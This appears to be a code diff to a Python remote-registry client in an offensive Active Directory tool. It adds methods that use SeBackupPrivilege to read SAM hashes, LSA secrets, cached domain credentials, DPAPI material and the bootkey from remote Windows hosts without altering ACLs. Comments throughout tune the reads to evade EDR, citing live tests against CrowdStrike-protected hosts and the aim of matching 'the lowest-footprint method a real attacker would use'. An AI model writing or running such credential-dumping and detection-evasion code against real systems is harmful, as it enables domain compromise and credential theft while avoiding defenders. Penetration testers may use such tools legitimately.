@@ -347,6 +347,66 @@ class RRPRPC:
 				return None, OSError(e.get_error_code(), system_errors.ERROR_MESSAGES[e.get_error_code()][1])
 			return None, e
 
+	async def OpenKeyBackup(self, key, sub_key):
+		# Open a key with dwOptions = REG_OPTION_BACKUP_RESTORE (0x4) |
+		# REG_OPTION_OPEN_LINK (0x8) and samDesired = 0. The backup-restore
+		# flag makes the server honour SeBackupPrivilege, which a local admin
+		# AND a Backup Operator both hold, so the read bypasses the key ACL
+		# WITHOUT modifying the DACL. samDesired=0 (not a KEY_READ bitmask)
+		# mirrors impacket's own protected-data opens byte-for-byte
+		# (examples/regsecrets.py retrieveSubKey/enumSubKey/enumValues all
+		# pass samDesired=None, which serializes to 0) -- live-confirmed
+		# 2026-10-07 against a CrowdStrike-protected host: that exact
+		# dwOptions/samDesired pair round-trips the full SAM+LSA+DCC2+DPAPI
+		# read cleanly there. BACKUP_RESTORE's privilege-based bypass is what
+		# actually grants the effective access; the requested samDesired bits
+		# are close to advisory under it, and requesting a NARROWER mask than
+		# strictly necessary is the lower-footprint, closer-to-impacket choice.
+		# Distinct from OpenKey() on purpose: OpenKey() currently passes the
+		# access mask into the dwOptions slot (a latent bug tracked in
+		# BACKLOG), and it is used by ~8 other consumers, so this low-footprint
+		# path is a separate method rather than a change to the shared one.
+		try:
+			key = await self.__get_rawhandle(key)
+			res, err = await rrp.hBaseRegOpenKey(self.dce, key, sub_key, 0x0000000C, 0x00000000)
+			if err is not None:
+				raise err
+			return self.__get_handle(res['phkResult']), None
+		except Exception as e:
+			if isinstance(e, rrp.DCERPCSessionError):
+				return None, OSError(e.get_error_code(), system_errors.ERROR_MESSAGES[e.get_error_code()][1])
+			return None, e
+
+	async def OpenKeyPlain(self, key, sub_key):
+		# A BARE hBaseRegOpenKey with NO dwOptions/samDesired override (vendor
+		# defaults: dwOptions=0x00000001, samDesired=MAXIMUM_ALLOWED) -- i.e.
+		# NOT a backup-privileged open. Mirrors impacket's own
+		# examples/regsecrets.py getBootKey() EXACTLY, which never requests
+		# backup semantics for the SYSTEM\CurrentControlSet\Control\Lsa\* class
+		# reads the bootkey is derived from: an admin's (or Backup Operator's)
+		# normal DACL grant already covers that key, unlike the actual
+		# protected SAM/SECURITY secret data OpenKeyBackup serves.
+		#
+		# Why this exists, concretely (live finding 2026-10-07): a
+		# CrowdStrike-protected host let impacket's plain bootkey open through
+		# untouched while our OpenKeyBackup-for-every-open pattern broke the
+		# \pipe\winreg pipe on that EXACT SAME semantic read. Requesting
+		# elevated backup-restore semantics for data that doesn't need them is
+		# an unusual, flaggable request pattern a real attacker's tooling
+		# (impacket) deliberately avoids -- and ADscan must match the
+		# lowest-footprint method a real attacker would use (CLAUDE.md §
+		# OPSEC), not request more privilege than the read actually needs.
+		try:
+			key = await self.__get_rawhandle(key)
+			res, err = await rrp.hBaseRegOpenKey(self.dce, key, sub_key)
+			if err is not None:
+				raise err
+			return self.__get_handle(res['phkResult']), None
+		except Exception as e:
+			if isinstance(e, rrp.DCERPCSessionError):
+				return None, OSError(e.get_error_code(), system_errors.ERROR_MESSAGES[e.get_error_code()][1])
+			return None, e
+
 	async def QueryInfoKey(self, key):
 		try:
 			key = await self.__get_rawhandle(key)
@@ -483,6 +543,22 @@ class RRPRPC:
 				return None, None, OSError(e.get_error_code(), system_errors.ERROR_MESSAGES[e.get_error_code()][1])
 			return None, e
 
+	async def OpenRegPathBackup(self, fullpath):
+		# OpenRegPath variant whose leaf subkey is opened via OpenKeyBackup
+		# (SeBackupPrivilege, no DACL change). The root HKEY handle does not take
+		# the backup flag; only the subkey open needs it.
+		try:
+			reg_root, key_path = fullpath.split('\\', 1)
+			root_key = hkey_abbrev[reg_root]
+			key, err = await self.ConnectRegistry(root_key, access=REG_ACCESS_MASK.MAXIMUM_ALLOWED)
+			if err is not None:
+				return None, err
+			return await self.OpenKeyBackup(key, key_path)
+		except Exception as e:
+			if isinstance(e, rrp.DCERPCSessionError):
+				return None, None, OSError(e.get_error_code(), system_errors.ERROR_MESSAGES[e.get_error_code()][1])
+			return None, e
+
 	######### custom methods
 
 	async def ListUsers(self, users_handle = None):
@@ -586,12 +662,48 @@ class RRPRPC:
 		except Exception as e:
 			return None, e
 
+def _rrp_err_is_access_denied(err) -> bool:
+	"""Whether an OpenKey failure is an authorization denial.
+
+	``OpenKeyPlain`` returns an ``OSError`` carrying the DCE/RPC code for a
+	session error and the raw exception otherwise, so both shapes have to be
+	recognised to decide whether the privilege bypass is worth one retry.
+	"""
+	for attr in ('errno', 'error_code', 'errorCode'):
+		code = getattr(err, attr, None)
+		if isinstance(code, int) and code == 5:
+			return True
+	text = str(err).lower()
+	return 'access_denied' in text or 'access denied' in text
+
+
 class SMBWinRegHive:
 	"""
 	Async version of the hive parser
 	"""
-	def __init__(self, rrprpc:RRPRPC, hive_path:str, target_sid:str = 'S-1-5-32-544', cache_enabled = True, print_cb = None):
-		# target_sid assumes that the user is a member of the Administrators group
+	def __init__(self, rrprpc:RRPRPC, hive_path:str, target_sid:str = 'S-1-5-32-544', cache_enabled = True, print_cb = None, backup_mode = False, plain_mode = False):
+		# target_sid assumes that the user is a member of the Administrators group.
+		# backup_mode: open EVERY key in this hive via SeBackupPrivilege
+		# (REG_OPTION_BACKUP_RESTORE) and skip the SetKeySecurity DACL dance —
+		# no disk, no DACL change, works for a Backup Operator. Needed for a
+		# hive whose protected secret data (SAM's F/V values, SECURITY's
+		# Policy\Secrets\*/Cache) is denied to EVERY principal including a
+		# Domain Admin without the privilege bypass — confirmed live
+		# 2026-10-07 against a real DA account on a GOAD DC: QueryValue/
+		# EnumKey/EnumValue on those keys return ERROR_ACCESS_DENIED even
+		# though the plain OpenKey that produced the handle succeeded, so
+		# there is no admin-vs-Backup-Operator distinction for THIS hive —
+		# everyone needs the bypass.
+		#
+		# plain_mode: open every key via a genuinely PLAIN, non-privileged
+		# OpenKeyPlain -- no backup flag, no DACL change, no fallback. For
+		# a hive whose DACL is permissive enough that any admin/Backup-
+		# Operator read already works unprivileged (SYSTEM's bootkey-class
+		# reads were already proven plain-readable; this extends that to the
+		# rest of the SYSTEM hive). Mutually exclusive with backup_mode;
+		# plain_mode wins if both are set.
+		self.backup_mode = backup_mode
+		self.plain_mode = plain_mode
 		self.print_cb = print_cb
 		self.rrprpc = rrprpc
 		self.hive_path = hive_path
@@ -643,7 +755,12 @@ class SMBWinRegHive:
 		return original_key_sd
 
 	async def setup(self):
-		self.hive_handle, err = await self.rrprpc.OpenRegPath(self.hive_path, access = REG_ACCESS_MASK.GENERIC_READ)
+		if self.plain_mode:
+			self.hive_handle, err = await self.rrprpc.OpenRegPath(self.hive_path, access = REG_ACCESS_MASK.GENERIC_READ)
+		elif self.backup_mode:
+			self.hive_handle, err = await self.rrprpc.OpenRegPathBackup(self.hive_path)
+		else:
+			self.hive_handle, err = await self.rrprpc.OpenRegPath(self.hive_path, access = REG_ACCESS_MASK.GENERIC_READ)
 		if err is not None:
 			raise err
 	
@@ -657,14 +774,47 @@ class SMBWinRegHive:
 		if key_path in self.__key_lookup:
 			return self.__key_lookup[key_path]
 		
-		# opening the key first time
 		keynames = key_path.split('\\')
+
+		# Plain mode: open the FULL relative path in ONE OpenKeyPlain call --
+		# MS-RRP's BaseRegOpenKey accepts a backslash-delimited multi-component
+		# lpSubKey, so there is no need to walk the path component-by-component
+		# with a separate RPC open per segment. impacket's own regsecrets.py
+		# does exactly this (one hBaseRegOpenKey for the whole path), and the
+		# per-component walk was pure extra winreg-pipe traffic: it re-opened
+		# every shared prefix (Policy, Secrets, ...) once per leaf, since only
+		# the full path is memoized, not the intermediate handles. Collapsing
+		# to a single open cuts the RRP operation count on the pipe by ~2-4x
+		# for the LSA read (65 opens -> ~18 measured live 2026-10-07), matching
+		# impacket's much lower winreg footprint -- the lower-footprint method
+		# a real attacker's tooling uses (CLAUDE.md § OPSEC). No backup flag,
+		# no DACL change, no fallback (see __init__'s plain_mode docstring).
+		if self.plain_mode:
+			key_handle, err = await self.rrprpc.OpenKeyPlain(self.hive_handle, key_path)
+			if err is not None:
+				raise err
+			self.__key_lookup[key_path] = key_handle
+			return key_handle
+
+		# Backup mode: open the FULL relative path in ONE OpenKeyBackup call
+		# via SeBackupPrivilege, skipping the SetKeySecurity DACL dance -- same
+		# single-open rationale as plain_mode above (impacket opens
+		# r'SECURITY\Policy\PolEKList' etc. in one backup-flagged call), and it
+		# works for a Backup Operator (who cannot WriteDACL).
+		if self.backup_mode:
+			key_handle, err = await self.rrprpc.OpenKeyBackup(self.hive_handle, key_path)
+			if err is not None:
+				raise err
+			self.__key_lookup[key_path] = key_handle
+			return key_handle
+
+		# opening the key first time
 		key_handle = self.hive_handle
 		for keyname in keynames:
 			key_handle, err = await self.rrprpc.OpenKey(key_handle, keyname, access=REG_ACCESS_MASK.GENERIC_READ)
 			if err is not None:
 				raise err
-		
+
 		#adding access to the key
 		original_sd = await self.add_access(key_handle)
 		
@@ -759,23 +909,61 @@ class SMBWinRegHive:
 		return val_type, val_data, None
 		
 	async def get_class(self, key_path, throw = True):
-		"""Return the class value of a key"""
+		"""Return the class value of a key.
 
+		ALWAYS a plain open, never the backup-privileged route (regardless of
+		self.backup_mode) -- this never routes through find_key(). Mirrors
+		impacket's getBootKey() exactly: the only caller of get_class() is
+		pypykatz's bootkey derivation (SYSTEM\\CurrentControlSet\\Control\\
+		Lsa\\{JD,Skew1,GBG,Data}), and that read needs no elevated backup
+		semantics -- a normal admin/Backup-Operator DACL grant already covers
+		it. Requesting BACKUP_RESTORE there anyway was found live (2026-10-07,
+		against a CrowdStrike-protected host) to break the \\pipe\\winreg pipe
+		on exactly this call, while impacket's plain-open equivalent for the
+		SAME semantic read sails through untouched. See OpenKeyPlain's
+		docstring for the full rationale.
+		"""
 		if key_path in self.__classes_lookup:
 			return self.__classes_lookup[key_path]
 
-		key = await self.find_key(key_path, throw)
-
-		if key is None:
+		# Open the FULL relative path in ONE OpenKeyPlain call (BaseRegOpenKey
+		# takes a backslash-delimited multi-component lpSubKey) rather than one
+		# RPC open per path segment -- same single-open, lower-winreg-footprint
+		# rationale as find_key() above, and exactly how impacket's getBootKey()
+		# opens SYSTEM\CurrentControlSet\Control\Lsa\<key> (one call each).
+		key_handle, err = await self.rrprpc.OpenKeyPlain(self.hive_handle, key_path)
+		if err is not None and self.backup_mode and _rrp_err_is_access_denied(err):
+			# The plain open is right for a principal whose DACL grant covers
+			# this key, and it is the open that keeps the pipe intact on an
+			# EDR-protected host, so it stays FIRST and unchanged. It is not
+			# universal: a Backup Operators member is denied here, because its
+			# access to these four class fields comes from SeBackupPrivilege
+			# and not from the DACL, and hardcoding the plain open left that
+			# role no way to read the bootkey at all -- the hive-to-disk export
+			# was the only remaining route, which is the louder one.
+			#
+			# Retrying THIS ONE open with the bypass cannot reintroduce the
+			# broken-pipe finding that made the plain open the default: that
+			# failure killed the pipe before any answer came back, while this
+			# retry only ever runs after the server has answered, with a
+			# denial. The standard tooling's own Backup Operators module opens
+			# these same four reads with BACKUP_RESTORE|OPEN_LINK from the
+			# start, so the bypass is the documented way to read them.
+			key_handle, err = await self.rrprpc.OpenKeyBackup(
+				self.hive_handle, key_path
+			)
+		if err is not None:
+			if throw is True:
+				raise err
 			self.__classes_lookup[key_path] = None
 			return None
-		
-		data, err = await self.rrprpc.QueryInfoKeySpecial(key)
+
+		data, err = await self.rrprpc.QueryInfoKeySpecial(key_handle)
 		if err is not None:
 			if throw is True:
 				raise err
 			return None
-		
+
 		result = data['lpClassOut'].replace('\x00', '')
 		if self.cache_enabled is True:
 			self.__classes_lookup[key_path] = result
